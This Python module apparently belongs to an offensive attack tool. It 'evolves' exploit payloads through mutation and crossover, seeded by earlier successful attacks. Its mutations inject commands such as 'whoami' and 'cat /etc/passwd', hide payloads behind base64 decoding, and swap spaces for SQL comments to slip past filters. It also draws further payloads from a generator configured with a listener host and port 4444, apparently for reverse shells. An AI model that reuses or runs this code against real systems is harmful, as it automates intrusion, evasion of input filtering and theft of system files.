# zrc/ai/evolution.py — v15.2 — МУТАЦИЯ + КРОССОВЕР
import random
from typing import List, Dict
from src.ai.payload_generator import PayloadGenerator

class EvolutionEngine:
    def __init__(self):
        self.successes = {}
        self.payload_gen = PayloadGenerator()

    def add_success(self, payload: str, attack: str):
        if attack not in self.successes:
            self.successes[attack] = []
        if payload not in self.successes[attack]:
            self.successes[attack].append(payload)

    def _mutate(self, payload: str) -> str:
        mutations = [
            lambda p: p.replace("id", "whoami"),
            lambda p: p.replace("id", "cat /etc/passwd"),
            lambda p: p + " && id",
            lambda p: f"$(echo {p} | base64 -d)",
            lambda p: p.replace("'", '"'),
            lambda p: p.replace(" ", "/**/")
        ]
        return random.choice(mutations)(payload)

    def _crossover(self, p1: str, p2: str) -> str:
        if len(p1) < 2 or len(p2) < 2:
            return p1
        split = random.randint(1, min(len(p1), len(p2)) - 1)
        return p1[:split] + p2[split:]

    def evolve(self, previous_results: List[Dict]) -> List[str]:
        payloads = []
        for res in previous_results:
            if res.get("success"):
                base = res.get("vulnerable_payload") or res.get("token") or ""
                if base:
                    payloads.append(base)

        if not payloads:
            return []

        evolved = []
        for _ in range(20):
            if len(payloads) >= 2 and random.random() < 0.4:
                p1, p2 = random.sample(payloads, 2)
                child = self._crossover(p1, p2)
                evolved.append(self._mutate(child))
            else:
                p = random.choice(payloads)
                evolved.append(self._mutate(p))

        # Добавляем из генератора
        attack = previous_results[0].get('attack', 'xss') if previous_results else 'xss'
        gen_payloads = self.payload_gen.all_payloads(lhost="192.168.1.100", lport=4444).get(attack, [])
        evolved.extend(random.sample(gen_payloads, min(5, len(gen_payloads))))

        return list(set(evolved))[:15]